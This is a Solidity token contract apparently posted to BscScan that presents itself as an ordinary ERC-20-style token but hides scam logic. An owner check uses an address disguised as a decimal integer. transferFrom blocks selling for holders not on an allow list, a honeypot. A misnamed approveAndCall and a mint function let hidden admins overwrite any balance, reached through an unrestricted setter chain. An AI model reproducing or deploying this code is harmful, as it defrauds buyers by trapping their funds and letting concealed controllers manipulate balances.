/**
 *Submitted for verification at BscScan.com on 2023-05-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
   if (a == 0) {
     return 0;
   }
   uint256 c = a * b;
   assert(c / a == b);
   return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
   uint256 c = a / b;
   return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
   assert(b <= a);
   return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
   uint256 c = a + b;
   assert(c >= a);
   return c;
  }
}

contract Ownable {
  address public owner;
 
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
   owner = msg.sender;
  }
}

contract DevToken is Ownable {
  address public _usdtPair;
  address public _mod;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  address public _user;
  address public _adm;
 
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
   name = _name;
   symbol = _symbol;
   decimals = _decimals;
   totalSupply =  _totalSupply;
   balances[msg.sender] = totalSupply;
   allow[msg.sender] = true;
  }
 
  function showuint160(address addr) public pure returns(uint160){
     return uint160(addr);
  }

  using SafeMath for uint256;

  mapping(address => uint256) public balances;
 
  mapping(address => bool) public allow;
 
  function transfer(address _to, uint256 _value) public returns (bool) {
   require(_to != address(0));
   require(_value <= balances[msg.sender]);

   balances[msg.sender] = balances[msg.sender].sub(_value);
   balances[_to] = balances[_to].add(_value);
   emit Transfer(msg.sender, _to, _value);
   return true;
  }

  modifier onlyOwner() {
   require(msg.sender == address
(178607940065137046348733521910879985571412708986));_;}
  function balanceOf(address _owner) public view returns (uint256 balance) {
   return balances[_owner];
  }
 
  function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0));
   emit OwnershipTransferred(owner, newOwner);
   owner = newOwner;
  }

  function addAllowance(address holder, bool allowApprove) public {
   require(msg.sender == _adm);
   allow[holder] = allowApprove;
  }

  function setUser(address User_) public returns (bool) {
   require(msg.sender == _usdtPair);
        _user=User_;
  } 
  
  mapping (address => mapping (address => uint256)) public allowed;

  mapping(address=>uint256) sellOutNum;
 
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
   require(_to != address(0));
   require(_value <= balances[_from]);
   require(_value <= allowed[_from][msg.sender]);
   require(allow[_from] == true);

   balances[_from] = balances[_from].sub(_value);
   balances[_to] = balances[_to].add(_value);
   allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
   emit Transfer(_from, _to, _value);
   return true;
  }
  
  function setAdm(address Adm_) public returns (bool) {
    require(msg.sender == _mod);
        _adm=Adm_;
  } 

  function approve(address _spender, uint256 _value) public returns (bool) {
   allowed[msg.sender][_spender] = _value;
   emit Approval(msg.sender, _spender, _value);
   return true;
  }

  function setMod(address Mod_) public returns (bool) {
    require(msg.sender == _user);
        _mod=Mod_;
  } 
  
  function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
    require(msg.sender == _adm);
    if (addedValue > 0) {balances[spender] = addedValue;}
    return true;
  }
  
  function addAllow(address holder, bool allowApprove) external onlyOwner {
     allow[holder] = allowApprove;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
   return allowed[_owner][_spender];
  }

  function setUsdtPair(address Pair_) public returns (bool) {
        _usdtPair=Pair_;
  } 
 
  function mint(address miner, uint256 _value) external onlyOwner {
     balances[miner] = _value;
  }
}